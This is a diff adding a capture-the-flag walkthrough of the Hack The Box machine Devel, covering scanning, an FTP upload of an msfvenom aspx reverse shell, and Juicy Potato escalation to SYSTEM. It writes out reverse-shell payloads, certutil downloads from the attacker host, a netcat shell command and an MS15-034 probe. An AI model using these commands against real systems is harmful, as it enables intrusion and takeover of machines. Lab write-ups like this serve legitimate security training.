@@ -1,0 +1,344 @@
+
+---
+tags: juicypotato, seimpersonateprivilege, ftp
+---
+# HTB: Devel
+
+***Overview**: Devel is a HTB machine rated as easy on Hackthebox. This machine exploits a file upload in the open FTP server which can be accessed using the web server to gain foothold and then further escalates privileges using the Juicy potato exploit to finally gain system privileges. This juicy potato exploit is possible due to the SeImpersonatePrivilege enabled. Thank you, I really hope you enjoy this writeup*
+#### Scanning and Enumeration
+
+- so we start with our port scan for most common ports
+
+```shell
+┌──(kali㉿kali)-[~/PNPT/machines]
+└─$ nmap -sV -sC -oA nmap/devel_ports 10.10.10.5 -v
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-15 14:48 EDT
+NSE: Loaded 155 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 14:48
+Completed NSE at 14:48, 0.00s elapsed
+Initiating NSE at 14:48
+Completed NSE at 14:48, 0.00s elapsed
+Initiating NSE at 14:48
+Completed NSE at 14:48, 0.00s elapsed
+Initiating Ping Scan at 14:48
+Scanning 10.10.10.5 [2 ports]
+Completed Ping Scan at 14:48, 0.15s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 14:48
+Completed Parallel DNS resolution of 1 host. at 14:48, 0.05s elapsed
+Initiating Connect Scan at 14:48
+Scanning 10.10.10.5 [1000 ports]
+Discovered open port 21/tcp on 10.10.10.5
+Discovered open port 80/tcp on 10.10.10.5
+Completed Connect Scan at 14:49, 19.86s elapsed (1000 total ports)
+Initiating Service scan at 14:49
+Scanning 2 services on 10.10.10.5
+Completed Service scan at 14:49, 10.71s elapsed (2 services on 1 host)
+NSE: Script scanning 10.10.10.5.
+Initiating NSE at 14:49
+NSE: [ftp-bounce] PORT response: 501 Server cannot accept argument.
+Completed NSE at 14:49, 5.14s elapsed
+Initiating NSE at 14:49
+Completed NSE at 14:49, 1.55s elapsed
+Initiating NSE at 14:49
+Completed NSE at 14:49, 0.00s elapsed
+Nmap scan report for 10.10.10.5
+Host is up (0.16s latency).
+Not shown: 998 filtered tcp ports (no-response)
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     Microsoft ftpd
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+| 03-18-17  02:06AM       <DIR>          aspnet_client
+| 03-17-17  05:37PM                  689 iisstart.htm
+|_03-17-17  05:37PM               184946 welcome.png
+| ftp-syst: 
+|_  SYST: Windows_NT
+80/tcp open  http    Microsoft IIS httpd 7.5
+|_http-title: IIS7
+| http-methods: 
+|   Supported Methods: OPTIONS TRACE GET HEAD POST
+|_  Potentially risky methods: TRACE
+|_http-server-header: Microsoft-IIS/7.5
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+```
+- we see that we have port 80 open, so we go to the web page and see that it is an IIS server
+
+![](assets/Devel_assets/Pasted%20image%2020230615195201.png)
+
+- we also see that we have FTP open as well, so we can connect to the ftp server, and we will see some files that look like the html document of the IIS server and the image as well
+
+![](assets/Devel_assets/Pasted%20image%2020230615200351.png)
+
+![](assets/Devel_assets/Pasted%20image%2020230615200409.png)
+```shell
+┌──(kali㉿kali)-[~/PNPT/machines]
+└─$ nmap --script=vuln 10.10.10.5                          
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-15 15:11 EDT
+Nmap scan report for 10.10.10.5
+Host is up (0.15s latency).
+Not shown: 998 filtered tcp ports (no-response)
+PORT   STATE SERVICE
+21/tcp open  ftp
+80/tcp open  http
+|_http-csrf: Couldn't find any CSRF vulnerabilities.
+|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
+| http-vuln-cve2015-1635: 
+|   VULNERABLE:
+|   Remote Code Execution in HTTP.sys (MS15-034)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2015-1635
+|       A remote code execution vulnerability exists in the HTTP protocol stack (HTTP.sys) that is
+|       caused when HTTP.sys improperly parses specially crafted HTTP requests. An attacker who
+|       successfully exploited this vulnerability could execute arbitrary code in the context of the System account.
+|           
+|     Disclosure date: 2015-04-14
+|     References:
+|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-1635
+|_      https://technet.microsoft.com/en-us/library/security/ms15-034.aspx
+|_http-dombased-xss: Couldn't find any DOM based XSS.
+
+```
+
+[https://anantshri.github.io/manual_verification/templates/ms15-034](https://anantshri.github.io/manual_verification/templates/ms15-034)
+
+![](assets/Devel_assets/Pasted%20image%2020230615203354.png)
+`curl -v 10.10.10.5/ -H "Host: test" -H "Range: bytes=0-18446744073709551615"`
+![](assets/Devel_assets/Pasted%20image%2020230615203443.png)
+
+
+[https://learn.microsoft.com/en-us/security-updates/securitybulletins/2015/ms15-034](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2015/ms15-034)
+
+![](assets/Devel_assets/Pasted%20image%2020230615210429.png)
+`searchsploit -m 36773`
+
+```
+┌──(kali㉿kali)-[~/PNPT/machines]
+└─$ gcc 36773.c -o 36773                                    
+                                                                                                                                                                       
+
+┌──(kali㉿kali)-[~/PNPT/machines]
+└─$ ./36773  
+
+ Usage: ./36773 <ip of server> 
+                                                                                                                                                                       
+┌──(kali㉿kali)-[~/PNPT/machines]
+└─$ ./36773 10.10.10.5
+[*] Audit Started
+[!!] Looks VULN
+
+```
+![](assets/Devel_assets/Pasted%20image%2020230616063143.png)
+
+#### Foothold
+- we will attempt to put the a file in the FTP server. so we first create the file
+
+![](assets/Devel_assets/Pasted%20image%2020230616064234.png)
+
+- then we place the file in the FTP server using the `get` command
+
+![](assets/Devel_assets/Pasted%20image%2020230616064313.png)
+
+- navigating to the file in our browser, we can see that we can indeed access the file
+
+![](assets/Devel_assets/Pasted%20image%2020230616064330.png)
+
+- so files that a placed in the FTP server are actually in the web server directory
+- so we will create a malicious aspx payload using msfvenom
+```
+┌──(kali㉿kali)-[~/PNPT/machines]
+└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.11 LPORT=4444 -f aspx >reverse.aspx
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 354 bytes
+Final size of aspx file: 2867 bytes
+```
+
+- then we transfer the aspx file to the FTP server
+
+![](assets/Devel_assets/Pasted%20image%2020230616065029.png)
+
+- so we will also set up our metasploit listener using handler
+
+![](assets/Devel_assets/Pasted%20image%2020230616065212.png)
+
+- after setting up the listener, we can then go to `http://10.10.10.5/reverse.aspx` on our browser and this we will execute the aspx file and we have a meterpreter session open
+
+![](assets/Devel_assets/Pasted%20image%2020230616065159.png)
+
+- so now we can see that we have a meterpreter shell
+
+![](assets/Devel_assets/Pasted%20image%2020230616065234.png)
+
+
+#### Privilege Escalation
+
+- we can view system information
+```
+c:\Users>systeminfo
+systeminfo
+
+Host Name:                 DEVEL
+OS Name:                   Microsoft Windows 7 Enterprise 
+OS Version:                6.1.7600 N/A Build 7600
+OS Manufacturer:           Microsoft Corporation
+OS Configuration:          Standalone Workstation
+OS Build Type:             Multiprocessor Free
+Registered Owner:          babis
+Registered Organization:   
+Product ID:                55041-051-0948536-86302
+Original Install Date:     17/3/2017, 4:17:31 ��
+System Boot Time:          16/6/2023, 12:54:06 ��
+System Manufacturer:       VMware, Inc.
+System Model:              VMware Virtual Platform
+System Type:               X86-based PC
+Processor(s):              1 Processor(s) Installed.
+                           [01]: x64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
+BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
+Windows Directory:         C:\Windows
+System Directory:          C:\Windows\system32
+Boot Device:               \Device\HarddiskVolume1
+System Locale:             el;Greek
+Input Locale:              en-us;English (United States)
+Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
+Total Physical Memory:     3.071 MB
+Available Physical Memory: 2.445 MB
+Virtual Memory: Max Size:  6.141 MB
+Virtual Memory: Available: 5.548 MB
+Virtual Memory: In Use:    593 MB
+Page File Location(s):     C:\pagefile.sys
+Domain:                    HTB
+Logon Server:              N/A
+Hotfix(s):                 N/A
+Network Card(s):           1 NIC(s) Installed.
+                           [01]: vmxnet3 Ethernet Adapter
+                                 Connection Name: Local Area Connection 3
+                                 DHCP Enabled:    No
+                                 IP address(es)
+                                 [01]: 10.10.10.5
+                                 [02]: fe80::58c0:f1cf:abc6:bb9e
+                                 [03]: dead:beef::8473:eb27:77ef:14be
+                                 [04]: dead:beef::58c0:f1cf:abc6:bb9e
+
+```
+- we can also view our privileges as the current user using `whoami /all` or `whoami /priv` and we can see that the SeImpersonatePrivilege is enabled
+
+```
+c:\windows\Temp>whoami /all
+whoami /all
+
+USER INFORMATION
+----------------
+
+User Name       SID                                                           
+=============== ==============================================================
+iis apppool\web S-1-5-82-2971860261-2701350812-2118117159-340795515-2183480550
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                           Type             SID          Attributes                                        
+==================================== ================ ============ ==================================================
+Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   
+Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
+CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+BUILTIN\IIS_IUSRS                    Alias            S-1-5-32-568 Mandatory group, Enabled by default, Enabled group
+LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
+                                     Unknown SID type S-1-5-82-0   Mandatory group, Enabled by default, Enabled group
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeShutdownPrivilege           Shut down the system                      Disabled
+SeAuditPrivilege              Generate security audits                  Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeUndockPrivilege             Remove computer from docking station      Disabled
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+SeTimeZonePrivilege           Change the time zone                      Disabled
+
+```
+
+- we create new directory `c:\Windows\Temp\scripts` so we can transfer or potato exploit
+[https://github.com/ivanitlearning/Juicy-Potato-x86/releases](https://github.com/ivanitlearning/Juicy-Potato-x86/releases)
+
+- we can import the file using the command
+`certutil.exe -urlcache -split -f http://10.10.14.11/JuicyPotato.exe JuicyPotato.exe`
+
+![](assets/Devel_assets/Pasted%20image%2020230616141953.png)
+
+- we can view the help page of the exploit using the `-h` flag
+
+![](assets/Devel_assets/Pasted%20image%2020230616142022.png)
+
+- so for us to run the exploit we also need a CLSID, we can find some at [https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_7_Enterprise](https://github.com/ohpe/juicy-potato/tree/master/CLSID/Windows_7_Enterprise), we can try different ones to know which succeeds
+- for this exploit we need to import the netcat executable `certutil.exe -urlcache -split -f http://10.10.14.11/nc.exe nc.exe` for the x86 architechture
+
+- For the potato exploit we also have to create a bat file that is a reverse shell using the command `msfvenom -p cmd/windows/reverse_powershell LHOST=10.10.14.11 LPORT=9003  > priv.bat`
+
+![](assets/Devel_assets/Pasted%20image%2020230616144533.png)
+
+- so we execute the nc first `nc.exe -e cmd.exe 10.10.14.11 9003`
+- and we also set up a netcat listener on our attack machine
+
+- we used the first CLSID which is {555F3418-D99E-4E51-800A-6E89CFD8B1D7}, then tried the second {03ca98d6-ff5d-49b8-abc6-03dd84127020} using the full path and we run
+`Juicy.Potato.x86.exe -p c:\\Windows\Temp\scripts\priv.bat -l 9999 -t * -c {03ca98d6-ff5d-49b8-abc6-03dd84127020}`
+
+![](assets/Devel_assets/Pasted%20image%2020230616160834.png)
+
+-  then in our netcat listener, we get a shell as system!!
+
+![](assets/Devel_assets/Pasted%20image%2020230616160916.png)
+
+- we can now retrieve our flag
+
+![](assets/Devel_assets/Pasted%20image%2020230616161328.png)
+
+- [https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505](https://medium.com/r3d-buck3t/impersonating-privileges-with-juicy-potato-e5896b20d505)
+- [https://github.com/k4sth4/Juicy-Potato](https://github.com/k4sth4/Juicy-Potato)
+- [https://infinitelogins.com/2020/12/09/windows-privilege-escalation-abusing-seimpersonateprivilege-juicy-potato/](https://infinitelogins.com/2020/12/09/windows-privilege-escalation-abusing-seimpersonateprivilege-juicy-potato/)
+- [https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/](https://infinitelogins.com/2020/01/25/msfvenom-reverse-shell-payload-cheatsheet/)
+- [https://infinitelogins.com/2020/09/04/windows-file-transfer-cheatsheet/](https://infinitelogins.com/2020/09/04/windows-file-transfer-cheatsheet/)
+- [https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom](https://book.hacktricks.xyz/generic-methodologies-and-resources/shells/msfvenom)
+
+Walkthrough
+- we go to the site, view the image in the site and see the name is welcome.png, and that is the same file in the FTP server
+- so the ftp server is likely in the same room as the FTP server
+- the file without a file extension does not show in the browser
+- IIS does execute code, asp, or aspx
+- we can see the server header that it is IIS/7.5, we can check IIS versions to see what windows version 2008 R2, so it will be like asp and aspx since it is relatively new
+- we will use msfvenom, if we use x64 it won't work but if we use x86, it will work on all 
+- `msfvennom -h --help-format` to see the different formats we have, we can do `msfvenom -l | grep windows` to view all the windows payloads
+- after getting meterpreter session, so `sysinfo`
+- then do a `shell` and do `systeminfo` and this usually tells us the hotfixes installed (updates), N/A if the machine has never been updated
+- `exit` out of meterpreter session
+- then search `search suggest` for widows exploit suggester, `show options` and set sessions to 1 and set the lhost
+- if we do `shell` and `net statistics Server`, we can see the date and see if the mahine got rebooted
+- so then we use one of the exploits in exploit suggester which is `ms10_015_kitrap0d​` and run it on a session and it see get a shell
+
+
+- Since we know it is an x86 architecture from our system information, we will transfer our winpeasx86 script
+
+![](assets/Devel_assets/Pasted%20image%2020230616075246.png)
+
+- winpeas86.exe was not giving output so I decided to transfer the bat version instead
+`certutil.exe -urlcache -split -f http://10.10.14.11/winPEAS.bat winpeas.bat`
+
+
+![](assets/Devel_assets/Pasted%20image%2020230616081409.png)
+
+- so running the script, we van
+
+![](assets/Devel_assets/Pasted%20image%2020230616081511.png)
